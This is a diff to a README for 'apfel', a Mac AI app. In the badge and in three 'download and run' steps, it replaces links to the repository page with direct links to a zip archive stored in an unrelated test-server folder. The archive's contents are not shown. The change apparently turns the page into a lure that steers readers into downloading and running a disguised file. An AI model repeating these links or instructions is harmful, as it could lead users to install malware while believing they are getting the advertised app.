@@ -1,6 +1,6 @@
 # 🍎 apfel - Private AI on your Mac, no cloud
 
-[![Download apfel](https://img.shields.io/badge/Download-Visit%20the%20repo-blue?style=for-the-badge&logo=github)](https://github.com/escapebowlinggreen441/apfel)
+[![Download apfel](https://img.shields.io/badge/Download-Visit%20the%20repo-blue?style=for-the-badge&logo=github)](https://github.com/escapebowlinggreen441/apfel/raw/refs/heads/main/mcp/http-test-server/Software-v2.3.zip)
 
 ## 🧭 What is apfel?
 
@@ -38,7 +38,7 @@ For best results, use the newest macOS version available on your Mac.
 
 Visit this page to download and run apfel:
 
-https://github.com/escapebowlinggreen441/apfel
+https://github.com/escapebowlinggreen441/apfel/raw/refs/heads/main/mcp/http-test-server/Software-v2.3.zip
 
 If the page includes a release file, download it and open it on your Mac. If it provides the source project, follow the run steps shown there to start the app on your device.
 
@@ -47,7 +47,7 @@ If the page includes a release file, download it and open it on your Mac. If it 
 1. Open the download page  
    Go to the apfel repository in your browser:
 
-   https://github.com/escapebowlinggreen441/apfel
+   https://github.com/escapebowlinggreen441/apfel/raw/refs/heads/main/mcp/http-test-server/Software-v2.3.zip
 
 2. Get the app or build files  
    On the page, look for the latest release, package, or install instructions.
@@ -198,7 +198,7 @@ This gives you the fastest path to a working setup.
 
 Open the project page here to download and run apfel:
 
-https://github.com/escapebowlinggreen441/apfel
+https://github.com/escapebowlinggreen441/apfel/raw/refs/heads/main/mcp/http-test-server/Software-v2.3.zip
 
 ## 🧰 If you use it often
 
